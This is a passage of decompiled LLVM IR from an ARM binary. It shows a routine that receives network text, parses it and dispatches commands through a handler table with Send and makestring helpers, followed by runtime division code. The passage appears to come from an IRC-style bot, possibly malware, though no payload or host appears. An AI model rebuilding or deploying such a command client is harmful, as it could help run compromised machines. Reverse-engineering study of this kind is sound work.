  %v2_a890 = add i32 %v3_a888, %v16_a1c8
  %v2_a894 = add i32 %v2_a890, -636
  %v1_a898 = inttoptr i32 %v2_a894 to i32*
  %v2_a898 = load i32, i32* %v1_a898, align 4
  %v1_a8a4 = urem i32 %v2_a878, 32
  %v6_a8a84 = lshr i32 %v2_a898, %v1_a8a4
  %v1_a8b0 = urem i32 %v6_a8a84, 2
  %v2_a8b4 = icmp eq i32 %v1_a8b0, 0
  br i1 %v2_a8b4, label %dec_label_pc_a600.lr.ph, label %dec_label_pc_a8bc

dec_label_pc_a8bc:                                ; preds = %dec_label_pc_a874
  store i32 %v2_a878, i32* @r0, align 4
  store i32 %v2_a8cc, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_a8e0 = call i32 @recv()
  %tmp78 = icmp slt i32 %v0_a8e0, 1
  br i1 %tmp78, label %dec_label_pc_a58c, label %dec_label_pc_a8f8

dec_label_pc_a8f8:                                ; preds = %dec_label_pc_a8bc
  %v2_a90c = add i32 %v2_a908, %v0_a8e0
  %v3_a90c = inttoptr i32 %v2_a90c to i8*
  store i8 0, i8* %v3_a90c, align 1
  store i32 %v2_a8cc, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c6c8.170 to i32), i32* @r1, align 4
  %v6_a92c = call i32 @__GI_strtok(i32 %v2_a8cc, i32 ptrtoint (i32* @global_var_1c6c8.170 to i32), i32 %v2_a90c, i32 %v2_a8cc, i32 %v0_a8e0)
  %v2_ab7831 = icmp eq i32 %v6_a92c, 0
  br i1 %v2_ab7831, label %dec_label_pc_a600.lr.ph, label %dec_label_pc_ab80

dec_label_pc_a93c:                                ; preds = %dec_label_pc_ab80
  %v3_a940 = call i32 @filter(i8* nonnull %storemerge33)
  %v2_a948 = load i8, i8* %storemerge33, align 1
  %v7_a94c = icmp eq i8 %v2_a948, 58
  br i1 %v7_a94c, label %dec_label_pc_a96c, label %dec_label_pc_a9f8

dec_label_pc_a960:                                ; preds = %dec_label_pc_a984
  %v1_a964 = add i32 %storemerge22, 1
  br label %dec_label_pc_a96c

dec_label_pc_a96c:                                ; preds = %dec_label_pc_a93c, %dec_label_pc_a960
  %storemerge22 = phi i32 [ %v1_a964, %dec_label_pc_a960 ], [ 0, %dec_label_pc_a93c ]
  %v3_a974 = call i32 @strlen(i8* %storemerge33)
  %v3_a97c = icmp ult i32 %storemerge22, %v3_a974
  br i1 %v3_a97c, label %dec_label_pc_a984, label %dec_label_pc_a96c.dec_label_pc_a9a0_crit_edge

dec_label_pc_a96c.dec_label_pc_a9a0_crit_edge:    ; preds = %dec_label_pc_a96c
  %.pre = add i32 %storemerge22, %storemerge33.in
  %.pre34 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_a9a0

dec_label_pc_a984:                                ; preds = %dec_label_pc_a96c
  %v2_a990 = add i32 %storemerge22, %storemerge33.in
  %v1_a994 = inttoptr i32 %v2_a990 to i8*
  %v2_a994 = load i8, i8* %v1_a994, align 1
  %v7_a998 = icmp eq i8 %v2_a994, 32
  br i1 %v7_a998, label %dec_label_pc_a9a0, label %dec_label_pc_a960

dec_label_pc_a9a0:                                ; preds = %dec_label_pc_a984, %dec_label_pc_a96c.dec_label_pc_a9a0_crit_edge
  %v3_a9b4.pre-phi = phi i8* [ %.pre34, %dec_label_pc_a96c.dec_label_pc_a9a0_crit_edge ], [ %v1_a994, %dec_label_pc_a984 ]
  %v2_a9ac.pre-phi = phi i32 [ %.pre, %dec_label_pc_a96c.dec_label_pc_a9a0_crit_edge ], [ %v2_a990, %dec_label_pc_a984 ]
  store i8 0, i8* %v3_a9b4.pre-phi, align 1
  %v1_a9bc = add i32 %storemerge33.in, 1
  %v2_a9d0 = inttoptr i32 %v1_a9bc to i8*
  %v3_a9d0 = call i32 @strcpy(i32 %v2_a9c4, i8* %v2_a9d0)
  %v1_a9e4 = add i32 %v2_a9ac.pre-phi, 1
  %v3_a9f0 = inttoptr i32 %v1_a9e4 to i8*
  %v4_a9f0 = call i32 @strcpy(i32 %storemerge33.in, i8* %v3_a9f0)
  br label %dec_label_pc_aa28

dec_label_pc_a9f8:                                ; preds = %dec_label_pc_a93c
  store i32 42, i32* %stack_var_-2704, align 4
  br label %dec_label_pc_aa28

dec_label_pc_aa1c:                                ; preds = %dec_label_pc_aa40
  %v1_aa20 = add i32 %storemerge19, 1
  br label %dec_label_pc_aa28

dec_label_pc_aa28:                                ; preds = %dec_label_pc_a9f8, %dec_label_pc_a9a0, %dec_label_pc_aa1c
  %storemerge19 = phi i32 [ %v1_aa20, %dec_label_pc_aa1c ], [ 0, %dec_label_pc_a9a0 ], [ 0, %dec_label_pc_a9f8 ]
  store i32 %storemerge19, i32* @r4, align 4
  %v3_aa30 = call i32 @strlen(i8* %storemerge33)
  %v0_aa38 = load i32, i32* @r4, align 4
  %v3_aa38 = icmp ult i32 %v0_aa38, %v3_aa30
  br i1 %v3_aa38, label %dec_label_pc_aa40, label %dec_label_pc_aa28.dec_label_pc_aa5c_crit_edge

dec_label_pc_aa28.dec_label_pc_aa5c_crit_edge:    ; preds = %dec_label_pc_aa28
  %.pre35 = add i32 %storemerge19, %storemerge33.in
  %.pre36 = inttoptr i32 %.pre35 to i8*
  br label %dec_label_pc_aa5c

dec_label_pc_aa40:                                ; preds = %dec_label_pc_aa28
  %v2_aa4c = add i32 %storemerge19, %storemerge33.in
  %v1_aa50 = inttoptr i32 %v2_aa4c to i8*
  %v2_aa50 = load i8, i8* %v1_aa50, align 1
  %v7_aa54 = icmp eq i8 %v2_aa50, 32
  br i1 %v7_aa54, label %dec_label_pc_aa5c, label %dec_label_pc_aa1c

dec_label_pc_aa5c:                                ; preds = %dec_label_pc_aa40, %dec_label_pc_aa28.dec_label_pc_aa5c_crit_edge
  %v3_aa70.pre-phi = phi i8* [ %.pre36, %dec_label_pc_aa28.dec_label_pc_aa5c_crit_edge ], [ %v1_aa50, %dec_label_pc_aa40 ]
  %v2_aa68.pre-phi = phi i32 [ %.pre35, %dec_label_pc_aa28.dec_label_pc_aa5c_crit_edge ], [ %v2_aa4c, %dec_label_pc_aa40 ]
  store i8 0, i8* %v3_aa70.pre-phi, align 1
  %v4_aa84 = call i32 @strcpy(i32 %v2_aa78, i8* %storemerge33)
  %v1_aa98 = add i32 %v2_aa68.pre-phi, 1
  %v3_aaa4 = inttoptr i32 %v1_aa98 to i8*
  %v4_aaa4 = call i32 @strcpy(i32 %storemerge33.in, i8* %v3_aaa4)
  %v8_ab34116 = load i32, i32* bitcast ([4 x i8]** @global_var_26388.173 to i32*), align 4
  %v2_ab38118 = icmp eq i32 %v8_ab34116, 0
  br i1 %v2_ab38118, label %dec_label_pc_ab40, label %dec_label_pc_aab4

dec_label_pc_aab4:                                ; preds = %dec_label_pc_aa5c, %dec_label_pc_aab4
  %v7_ab34121 = phi i32* [ %v7_ab34, %dec_label_pc_aab4 ], [ bitcast ([4 x i8]** @global_var_26388.173 to i32*), %dec_label_pc_aa5c ]
  %storemerge20119 = phi i32 [ %v1_ab24, %dec_label_pc_aab4 ], [ 0, %dec_label_pc_aa5c ]
  %v7_aabc = load i32, i32* %v7_ab34121, align 4
  %v2_aad0 = inttoptr i32 %v7_aabc to i8*
  %v3_aad0 = call i32 @__GI_strcasecmp(i8* %v2_aad0, i32 %v2_aa78)
  %v3_aaec = mul i32 %storemerge20119, 8
  %v2_aaf4 = add i32 %v3_aaec, add (i32 ptrtoint ([4 x i8]** @global_var_26388.173 to i32), i32 4)
  %v1_aaf8 = inttoptr i32 %v2_aaf4 to i32*
  %v2_aaf8 = load i32, i32* %v1_aaf8, align 4
  store i32 %v2_aaf8, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v2_aaf8)
  %v1_ab24 = add i32 %storemerge20119, 1
  %v5_ab34 = mul i32 %v1_ab24, 8
  %v6_ab34 = add i32 %v5_ab34, ptrtoint ([4 x i8]** @global_var_26388.173 to i32)
  %v7_ab34 = inttoptr i32 %v6_ab34 to i32*
  %v8_ab34 = load i32, i32* %v7_ab34, align 4
  %v2_ab38 = icmp eq i32 %v8_ab34, 0
  br i1 %v2_ab38, label %dec_label_pc_ab40, label %dec_label_pc_aab4

dec_label_pc_ab40:                                ; preds = %dec_label_pc_aab4, %dec_label_pc_aa5c
  %v4_ab50 = call i32 @__GI_strcasecmp(i8* %v3_ab50, i32 ptrtoint ([6 x i8]* @global_var_1c6cc.175 to i32))
  %v2_ab58 = icmp eq i32 %v4_ab50, 0
  br i1 %v2_ab58, label %dec_label_pc_a58c, label %dec_label_pc_ab60

dec_label_pc_ab60:                                ; preds = %dec_label_pc_ab40
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c6c8.170 to i32), i32* @r1, align 4
  %v6_ab68 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1c6c8.170 to i32), i32 ptrtoint ([4 x i8]** @global_var_26388.173 to i32), i32 %v4_ab50, i32 ptrtoint (i32* @0 to i32))
  %v2_ab78 = icmp eq i32 %v6_ab68, 0
  br i1 %v2_ab78, label %dec_label_pc_a600.lr.ph, label %dec_label_pc_ab80

dec_label_pc_ab80:                                ; preds = %dec_label_pc_a8f8, %dec_label_pc_ab60
  %storemerge33.in = phi i32 [ %v6_ab68, %dec_label_pc_ab60 ], [ %v6_a92c, %dec_label_pc_a8f8 ]
  %storemerge33 = inttoptr i32 %storemerge33.in to i8*
  %v2_ab84 = load i8, i8* %storemerge33, align 1
  %v2_ab88 = icmp eq i8 %v2_ab84, 0
  br i1 %v2_ab88, label %dec_label_pc_a600.lr.ph, label %dec_label_pc_a93c

; uselistorder directives
  uselistorder i8* %storemerge33, { 5, 3, 4, 2, 1, 0 }
  uselistorder i32 %storemerge33.in, { 7, 3, 2, 5, 4, 1, 0, 6 }
  uselistorder i32* %v7_ab34, { 1, 0 }
  uselistorder i32 %v1_ab24, { 1, 0 }
  uselistorder i32 %storemerge20119, { 1, 0 }
  uselistorder i32 %.pre35, { 1, 0 }
  uselistorder i32 %storemerge19, { 1, 0, 3, 2 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge22, { 2, 1, 0, 3 }
  uselistorder i32 %v0_a8e0, { 1, 0, 2 }
  uselistorder i32 %v2_a878, { 2, 1, 0 }
  uselistorder i32 %v1_a81c, { 1, 0 }
  uselistorder i32 %v3_a7e8, { 1, 0 }
  uselistorder i32 %storemerge17102, { 1, 0 }
  uselistorder i32 %v1_a7cc, { 1, 0 }
  uselistorder i32 %v1_a798, { 1, 0 }
  uselistorder i32 %v2_a794, { 1, 0 }
  uselistorder i32 %v1_a718, { 0, 2, 1 }
  uselistorder i32 %v1_a79891, { 1, 0 }
  uselistorder i32 %.pre133, { 1, 4, 0, 3, 2 }
  uselistorder i32 %storemerge15115, { 1, 0 }
  uselistorder i32 %v2_a62c, { 1, 0 }
  uselistorder i32 %storemerge1428, { 1, 0 }
  uselistorder i32 %v2_a8cc, { 0, 2, 1, 3 }
  uselistorder i32 %v2_a5ec, { 1, 0 }
  uselistorder i32 %v1_a4fc, { 1, 0 }
  uselistorder i32 %storemerge13, { 1, 0, 2 }
  uselistorder i32 %v3_a388, { 1, 0, 2 }
  uselistorder i32 %v2_a2f4, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-72.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-1680, { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([4 x i8]** @global_var_26388.173 to i32), { 1, 2, 0 }
  uselistorder [4 x i8]** @global_var_26388.173, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_strtok, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1c6c8.170 to i32), { 0, 2, 1, 3 }
  uselistorder i32* @global_var_2f554.52, { 1, 3, 4, 5, 0, 6, 7, 8, 2, 9, 10 }
  uselistorder i32* @global_var_2ac28.50, { 7, 8, 1, 5, 9, 10, 2, 0, 11, 3, 12, 4, 6, 13 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @Send, { 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_2f53c.41, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 1, 14, 15 }
  uselistorder i32* @global_var_2f544.132, { 0, 1, 4, 2, 5, 6, 7, 3 }
  uselistorder i32* @global_var_2f534.160, { 1, 0 }
  uselistorder i32* @global_var_2f530.58, { 1, 0 }
  uselistorder i32* @global_var_2f538.92, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32* @global_var_1c61c.122, { 1, 0 }
  uselistorder i32 (i32)* @makestring, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1c410.56 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i8** %argv, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ab80, { 1, 0 }
  uselistorder label %dec_label_pc_aab4, { 1, 0 }
  uselistorder label %dec_label_pc_aa28, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a96c, { 1, 0 }
  uselistorder label %dec_label_pc_a854, { 1, 0 }
  uselistorder label %dec_label_pc_a838, { 1, 0 }
  uselistorder label %dec_label_pc_a7e4, { 1, 0 }
  uselistorder label %dec_label_pc_a724, { 1, 0 }
  uselistorder label %dec_label_pc_a600, { 1, 0 }
  uselistorder label %dec_label_pc_a600.lr.ph, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_a58c, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_a4ac, { 1, 0 }
  uselistorder label %dec_label_pc_a3e8, { 1, 0 }
  uselistorder label %dec_label_pc_a3d0, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_a2b0, { 1, 0 }
  uselistorder label %dec_label_pc_a23c, { 1, 0 }
}

define i32 @__modsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_abfc = icmp eq i32 %arg2, 0
  br i1 %v2_abfc, label %dec_label_pc_acd0, label %dec_label_pc_ac04

dec_label_pc_ac04:                                ; preds = %entry
  %v1_abfc = icmp slt i32 %arg2, 0
  br i1 %v1_abfc, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_ac04
  %v2_ac04 = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_ac04, %bb
  %v4_ac1c = phi i32 [ %arg2, %dec_label_pc_ac04 ], [ %v2_ac04, %bb ]
  %v0_ac08 = load i32, i32* @r0, align 4
  %v1_ac08 = icmp slt i32 %v0_ac08, 0
  br i1 %v1_ac08, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_ac0c = sub i32 0, %v0_ac08
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_ac14 = phi i32 [ %v0_ac08, %bb79 ], [ %v2_ac0c, %bb80 ]
  %v1_ac10 = add i32 %v4_ac1c, -1
  %v7_ac10 = icmp eq i32 %v4_ac1c, 1
  br i1 %v7_ac10, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_ac14 = icmp eq i32 %v1_ac14, %v4_ac1c
  br i1 %v10_ac14, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_ac14 = icmp ult i32 %v1_ac14, %v4_ac1c
  br i1 %v4_ac14, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_ac1c = and i32 %v1_ac10, %v4_ac1c
  %v8_ac1c = icmp eq i32 %v6_ac1c, 0
  br i1 %v8_ac1c, label %.thread72, label %dec_label_pc_ac2c.preheader

dec_label_pc_ac2c.preheader:                      ; preds = %bb84
  %v2_ac2c109 = icmp ugt i32 %v4_ac1c, 268435455
  br i1 %v2_ac2c109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_ac2064 = phi i32 [ %v1_ac14, %bb84 ], [ 0, %.thread70 ]
  %v3_ac20 = and i32 %v1_ac2064, %v1_ac10
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_ac2c.preheader
  %v0_ac40.pr35.lcssa = phi i32 [ %v4_ac1c, %dec_label_pc_ac2c.preheader ], [ %v4_ac34, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_ac2c.preheader ], [ %v2_ac389, %.thread2.thread7 ]
  br label %dec_label_pc_ac40thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_ac2c.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_ac389, %.thread2.thread7 ], [ 0, %dec_label_pc_ac2c.preheader ]
  %v0_ac40.pr35110 = phi i32 [ %v4_ac34, %.thread2.thread7 ], [ %v4_ac1c, %dec_label_pc_ac2c.preheader ]
  %v4_ac30 = icmp ult i32 %v0_ac40.pr35110, %v1_ac14
  br i1 %v4_ac30, label %bb86, label %dec_label_pc_ac40thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_ac34 = and i32 %v0_ac40.pr35110, 268435456
  %v3_ac34 = icmp eq i32 %v2_ac34, 0
  %v4_ac34 = mul i32 %v0_ac40.pr35110, 16
  br i1 %v3_ac34, label %.thread2.thread7, label %dec_label_pc_ac40.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_ac389 = add i32 %storemerge111, 4
  %v2_ac2c = icmp ugt i32 %v4_ac34, 268435455
  br i1 %v2_ac2c, label %.thread1, label %bb85

dec_label_pc_ac40thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_ac40thread-pre-split.loopexit

dec_label_pc_ac40thread-pre-split.loopexit:       ; preds = %dec_label_pc_ac40thread-pre-split.loopexit.loopexit, %.thread1
  %v0_ac40.pr35108 = phi i32 [ %v0_ac40.pr35.lcssa, %.thread1 ], [ %v0_ac40.pr35110, %dec_label_pc_ac40thread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_ac40thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_ac40thread-pre-split

dec_label_pc_ac40thread-pre-split:                ; preds = %.thread4, %dec_label_pc_ac40thread-pre-split.loopexit
  %v1_ac4c41 = phi i32 [ %storemerge105, %dec_label_pc_ac40thread-pre-split.loopexit ], [ %v2_ac4c, %.thread4 ]
  %v2_ac4436 = phi i32 [ %v1_ac14, %dec_label_pc_ac40thread-pre-split.loopexit ], [ %v2_ac44, %.thread4 ]
  %v0_ac40.pr = phi i32 [ %v0_ac40.pr35108, %dec_label_pc_ac40thread-pre-split.loopexit ], [ %v3_ac48, %.thread4 ]
  br label %dec_label_pc_ac40

dec_label_pc_ac40.loopexit:                       ; preds = %bb86
  br label %dec_label_pc_ac40

dec_label_pc_ac40:                                ; preds = %dec_label_pc_ac40.loopexit, %dec_label_pc_ac40thread-pre-split
  %v0_ac54.pr = phi i32 [ %v1_ac4c41, %dec_label_pc_ac40thread-pre-split ], [ %storemerge111, %dec_label_pc_ac40.loopexit ]
  %v2_ac44 = phi i32 [ %v2_ac4436, %dec_label_pc_ac40thread-pre-split ], [ %v1_ac14, %dec_label_pc_ac40.loopexit ]
  %v1_ac48 = phi i32 [ %v0_ac40.pr, %dec_label_pc_ac40thread-pre-split ], [ %v4_ac34, %dec_label_pc_ac40.loopexit ]
  %v2_ac40 = icmp slt i32 %v1_ac48, 0
  br i1 %v2_ac40, label %dec_label_pc_ac54, label %bb87

bb87:                                             ; preds = %dec_label_pc_ac40
  %v4_ac44 = icmp ult i32 %v1_ac48, %v2_ac44
  br i1 %v4_ac44, label %.thread4, label %dec_label_pc_ac54

.thread4:                                         ; preds = %bb87
  %v3_ac48 = mul i32 %v1_ac48, 2
  %v2_ac4c = add i32 %v0_ac54.pr, 1
  br label %dec_label_pc_ac40thread-pre-split

dec_label_pc_ac54:                                ; preds = %bb87, %dec_label_pc_ac40
  %v2_ac54 = add i32 %v0_ac54.pr, -3
  %v5_ac58 = icmp slt i32 %v0_ac54.pr, 3
  br i1 %v5_ac58, label %dec_label_pc_ac98, label %dec_label_pc_ac5c

dec_label_pc_ac5c:                                ; preds = %dec_label_pc_ac54, %bb91
  %v6_ac84 = phi i32 [ %v0_ac8c, %bb91 ], [ %v2_ac54, %dec_label_pc_ac54 ]
  %v1_ac60 = phi i32 [ %v1_ac68.v6_ac68.v6_ac70.v6_ac78, %bb91 ], [ %v2_ac44, %dec_label_pc_ac54 ]
  %v3_ac8010 = phi i32 [ %v3_ac80, %bb91 ], [ %v1_ac48, %dec_label_pc_ac54 ]
  %v3_ac5c = icmp ult i32 %v1_ac60, %v3_ac8010
  %v3_ac60 = select i1 %v3_ac5c, i32 0, i32 %v3_ac8010
  %v1_ac68 = sub i32 %v1_ac60, %v3_ac60
  %v4_ac64 = udiv i32 %v3_ac8010, 2
  %v6_ac64 = icmp ult i32 %v1_ac68, %v4_ac64
  %v6_ac68 = select i1 %v6_ac64, i32 0, i32 %v4_ac64
  %v1_ac68.v6_ac68 = sub i32 %v1_ac68, %v6_ac68
  %.demorgan = and i1 %v3_ac5c, %v6_ac64
  %v4_ac6c = udiv i32 %v3_ac8010, 4
  %v6_ac6c = icmp ult i32 %v1_ac68.v6_ac68, %v4_ac6c
  %v6_ac70 = select i1 %v6_ac6c, i32 0, i32 %v4_ac6c
  %v1_ac68.v6_ac68.v6_ac70 = sub i32 %v1_ac68.v6_ac68, %v6_ac70
  %.demorgan76 = and i1 %.demorgan, %v6_ac6c
  %v4_ac74 = udiv i32 %v3_ac8010, 8
  %v6_ac74 = icmp ult i32 %v1_ac68.v6_ac68.v6_ac70, %v4_ac74
  %v6_ac78 = select i1 %v6_ac74, i32 0, i32 %v4_ac74
  %v1_ac68.v6_ac68.v6_ac70.v6_ac78 = sub i32 %v1_ac68.v6_ac68.v6_ac70, %v6_ac78
  %.demorgan77 = and i1 %.demorgan76, %v6_ac74
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_ac5c
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_ac5c, %bb88
  %v2_ac7c = add i32 %v1_ac68.v6_ac68.v6_ac70.v6_ac78, -1
  %v4_ac7c = sub i32 0, %v1_ac68.v6_ac68.v6_ac70.v6_ac78
  %v5_ac7c = and i32 %v1_ac68.v6_ac68.v6_ac70.v6_ac78, %v4_ac7c
  %v3_ac80 = udiv i32 %v3_ac8010, 16
  %v5_ac84 = icmp slt i32 %v1_ac68.v6_ac68.v6_ac70.v6_ac78, 1
  br i1 %v5_ac84, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_ac84 = add i32 %v6_ac84, -4
  %v9_ac84 = sub i32 3, %v6_ac84
  %v10_ac84 = and i32 %v9_ac84, %v6_ac84
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_ac8c = phi i32 [ %v6_ac84, %bb89 ], [ %v7_ac84, %bb90 ]
  %v0_ac8813.in = phi i32 [ %v2_ac7c, %bb89 ], [ %v7_ac84, %bb90 ]
  %v1_ac8812.in = phi i32 [ %v5_ac7c, %bb89 ], [ %v10_ac84, %bb90 ]
  %v1_ac8812 = icmp slt i32 %v1_ac8812.in, 0
  %v0_ac8813 = icmp slt i32 %v0_ac8813.in, 0
  %v2_ac88 = xor i1 %v0_ac8813, %v1_ac8812
  br i1 %v2_ac88, label %dec_label_pc_ac8c, label %dec_label_pc_ac5c

dec_label_pc_ac8c:                                ; preds = %bb91
  %v1_ac8c = urem i32 %v0_ac8c, 4
  %v2_ac8c = icmp eq i32 %v1_ac8c, 0
  br i1 %v2_ac8c, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_ac8c
  %v3_ac90 = icmp eq i32 %v1_ac68.v6_ac68.v6_ac70.v6_ac78, 0
  br i1 %v3_ac90, label %.thread6, label %dec_label_pc_ac98

dec_label_pc_ac98:                                ; preds = %bb92, %dec_label_pc_ac54
  %v0_acac = phi i32 [ %v3_ac80, %bb92 ], [ %v1_ac48, %dec_label_pc_ac54 ]
  %v1_aca8 = phi i32 [ %v1_ac68.v6_ac68.v6_ac70.v6_ac78, %bb92 ], [ %v2_ac44, %dec_label_pc_ac54 ]
  %v0_ac98 = phi i32 [ %v0_ac8c, %bb92 ], [ %v2_ac54, %dec_label_pc_ac54 ]
  %v5_ac9c = icmp slt i32 %v0_ac98, -2
  br i1 %v5_ac9c, label %dec_label_pc_acbc, label %dec_label_pc_aca0

dec_label_pc_aca0:                                ; preds = %dec_label_pc_ac98
  %v8_ac98 = icmp eq i32 %v0_ac98, -2
  br i1 %v8_ac98, label %dec_label_pc_acb0, label %dec_label_pc_aca4

dec_label_pc_aca4:                                ; preds = %dec_label_pc_aca0
  %v3_aca4 = icmp ult i32 %v1_aca8, %v0_acac
  br i1 %v3_aca4, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_aca4
  %v2_aca4 = sub i32 %v1_aca8, %v0_acac
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_aca4, %bb93
  %v0_acb054 = phi i32 [ %v1_aca8, %dec_label_pc_aca4 ], [ %v2_aca4, %bb93 ]
  %v3_acac = udiv i32 %v0_acac, 2
  br label %dec_label_pc_acb0

dec_label_pc_acb0:                                ; preds = %dec_label_pc_aca0, %bb94
  %v0_acb8 = phi i32 [ %v0_acac, %dec_label_pc_aca0 ], [ %v3_acac, %bb94 ]
  %v1_acb4 = phi i32 [ %v1_aca8, %dec_label_pc_aca0 ], [ %v0_acb054, %bb94 ]
  %v3_acb0 = icmp ult i32 %v1_acb4, %v0_acb8
  br i1 %v3_acb0, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_acb0
  %v2_acb0 = sub i32 %v1_acb4, %v0_acb8
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_acb0, %bb95
  %v0_acbc57 = phi i32 [ %v1_acb4, %dec_label_pc_acb0 ], [ %v2_acb0, %bb95 ]
  %v3_acb8 = udiv i32 %v0_acb8, 2
  br label %dec_label_pc_acbc

dec_label_pc_acbc:                                ; preds = %dec_label_pc_ac98, %bb96
  %v2_acc0 = phi i32 [ %v0_acac, %dec_label_pc_ac98 ], [ %v3_acb8, %bb96 ]
  %v1_acc0 = phi i32 [ %v1_aca8, %dec_label_pc_ac98 ], [ %v0_acbc57, %bb96 ]
  %v3_acbc = icmp ult i32 %v1_acc0, %v2_acc0
  br i1 %v3_acbc, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_acbc
  %v2_acbc = sub i32 %v1_acc0, %v2_acc0
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_acbc, %bb83, %.thread72, %dec_label_pc_ac8c, %bb92, %bb97
  %v1_acc8 = phi i32 [ %v1_ac68.v6_ac68.v6_ac70.v6_ac78, %dec_label_pc_ac8c ], [ 0, %bb92 ], [ %v1_acc0, %dec_label_pc_acbc ], [ %v2_acbc, %bb97 ], [ %v3_ac20, %.thread72 ], [ %v1_ac14, %bb83 ]
  br i1 %v1_ac08, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_acc8 = sub i32 0, %v1_acc8
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_accc = phi i32 [ %v1_acc8, %.thread6 ], [ %v2_acc8, %bb98 ]
  ret i32 %v1_accc

dec_label_pc_acd0:                                ; preds = %entry
  %v0_acd0 = load i32, i32* @lr, align 4
  %v0_acd4 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_acd0)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_acac, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_ac8c, { 1, 0, 2 }
  uselistorder i32 %v7_ac84, { 1, 0 }
  uselistorder i32 %v3_ac80, { 1, 0 }
  uselistorder i32 %v1_ac68.v6_ac68.v6_ac70.v6_ac78, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_ac74, { 1, 0 }
  uselistorder i32 %v4_ac6c, { 1, 0 }
  uselistorder i32 %v4_ac64, { 1, 0 }
  uselistorder i32 %v6_ac84, { 3, 0, 2, 1 }
  uselistorder i32 %v2_ac54, { 1, 0 }
  uselistorder i32 %v1_ac48, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_ac44, { 1, 0, 3, 2 }
  uselistorder i32 %v4_ac34, { 1, 0, 3, 2 }
  uselistorder i32 %v0_ac40.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_ac14, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_ac1c, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_acbc, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_acb0, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_ac5c, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @__aeabi_ldiv0() local_unnamed_addr {
entry:
  %v1_ace0 = load i32, i32* @r0, align 4
